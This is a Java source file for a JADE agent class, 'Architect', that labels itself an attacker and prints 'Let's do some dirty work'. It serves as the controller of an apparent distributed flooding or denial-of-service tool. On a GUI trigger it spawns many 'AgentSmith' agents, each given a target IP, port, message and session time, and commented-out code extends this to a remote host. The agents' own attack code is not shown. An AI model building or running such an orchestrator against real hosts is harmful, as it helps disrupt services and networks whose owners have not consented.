import jade.core.*;
import jade.core.behaviours.*;

import jade.domain.AMSService;
import jade.domain.FIPAAgentManagement.AMSAgentDescription;
import jade.domain.FIPAAgentManagement.SearchConstraints;
import jade.gui.GuiAgent;
import jade.gui.GuiEvent;
import jade.lang.acl.ACLMessage;
import jade.domain.FIPAAgentManagement.ServiceDescription;
import jade.domain.FIPAAgentManagement.DFAgentDescription;
import jade.domain.DFService;
import jade.domain.FIPAException;
import jade.core.Runtime;
import jade.core.Profile;
import jade.core.ProfileImpl;
import jade.wrapper.AgentController;
import jade.wrapper.ContainerController;
import jade.wrapper.StaleProxyException;
import java.net.*;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Admin
 */
public class Architect extends GuiAgent {

    // for local host
    ContainerController containerController;
    Runtime runtime;
    Profile agentProfile;
    AgentController controller;
    
//    // for remote host
//    ContainerController remote_containerController;
//    Runtime remote_runtime;
//    Profile remote_agentProfile;
//    AgentController remote_controller;
//    
    // creating a GUI
    private AgentGUI master_gui;
    // Architect IP addresss
    String my_ip_address;

    
    protected void setup() {

        master_gui = new AgentGUI(this);
        ReceiveMessage rm = new ReceiveMessage();
        String start_text = "Hello, I'm " + getLocalName() + ". Let's do some dirty work";
        System.out.println(start_text);
        master_gui.console_text_setter("************************ Attacker - Achitect ***************************");
        master_gui.console_text_setter(start_text + "\n");
        
        // adding listening behaviour
        addBehaviour(rm);
    }

    protected void onGuiEvent(GuiEvent ev) {

        if (ev.getType() == 1) {
            attack();
        } else {
            stop_attack();
        }
    }

    protected void attack() {
        runtime = Runtime.instance();

        // Local host
        // prepare the settings for the platform that we're going to connect to
        agentProfile = new ProfileImpl();
        agentProfile.setParameter(Profile.MAIN_HOST, "localhost");
        agentProfile.setParameter(Profile.MAIN_PORT, "1099");
        agentProfile.setParameter(Profile.CONTAINER_NAME, "Agent_Smiths");

        // create the agent container
        containerController = runtime.createAgentContainer(agentProfile);
        
        // Remotehost
//        remote_runtime = Runtime.instance();
//
//        // prepare the settings for the platform that we're going to connect to
//        remote_agentProfile = new ProfileImpl(false);
//        remote_agentProfile.setParameter(Profile.PLATFORM_ID, "192.168.26.188:1099/JADE");
//        remote_agentProfile.setParameter(Profile.MAIN_HOST, "192.168.26.188");
//        remote_agentProfile.setParameter(Profile.MAIN_PORT, "1099");
//        remote_agentProfile.setParameter(Profile.CONTAINER_NAME, "Remote_Agent_Smiths");
//
//        // create the agent container
//        remote_containerController = remote_runtime.createAgentContainer(remote_agentProfile);

        int total_num_agent = master_gui.total_num_agent;
        int session_time = master_gui.session_time;
        String message = master_gui.message;
        InetAddress target_ip = master_gui.target_ip;
        int port = master_gui.port;

        createAgent(total_num_agent, session_time, message, target_ip, port);

    }

    protected void stop_attack() {
        killContainer();
        System.out.println("Attack terminated successfully!!!");
        master_gui.console_text_setter(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
        master_gui.console_text_setter("Attack terminated successfully!!!");
        
    }

    public void createAgent(int total_num_agent, int session_time, String message, InetAddress target_ip, int port) {

        Object[] arguments = new Object[5];
        arguments[0] = target_ip;
        arguments[1] = port;
        arguments[2] = session_time;
        arguments[3] = message;
        
        try {
            arguments[4] = InetAddress.getLocalHost().getHostAddress();
        } catch (UnknownHostException ex) {
            Logger.getLogger(Architect.class.getName()).log(Level.SEVERE, null, ex);
        }
        
        master_gui.console_text_setter(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
        master_gui.console_text_setter(" Target  ==>   IP: " + target_ip.toString() + "     Port: " + port);
        master_gui.console_text_setter(" Number of Agnets: " + total_num_agent + "     Message: " + message + "\n");

        try {
            for (int i = 1; i <= total_num_agent + 1; i++) {
                // for local host
                controller = containerController.createNewAgent("AgentSmith" + i, "SimpleAgent", arguments);
                controller.start();
                
//                // for remote host
//                remote_controller = remote_containerController.createNewAgent("Remote_AgentSmith" + i, "SimpleAgent", arguments);
//                remote_controller.start();
            }
        } catch (StaleProxyException e) {
            e.printStackTrace();
            System.out.println("Problem Architect: " + e.toString());
        }

    }

    public void killContainer() {
        try {
            containerController.kill();
            //remote_containerController.kill();
        } catch (StaleProxyException e) {
            e.printStackTrace();
            System.out.println("Problem Architect: " + e.toString());
        }
    }

    public class ReceiveMessage extends CyclicBehaviour {

        // Variable to Hold the content of the received Message
        private String message_Performative;
        private String message_Content;
        private String senderName;

        public void action() {
            ACLMessage msg = receive();
            if (msg != null) {
                message_Performative = msg.getPerformative(msg.getPerformative());
                message_Content = msg.getContent();
                senderName = msg.getSender().getName();

                if (message_Performative == "FAILURE") {
                    System.out.println("Architect received a failure message from " + senderName);
                } else {
                    master_gui.console_text_setter(message_Content);
                }
            }
        }

    }
}
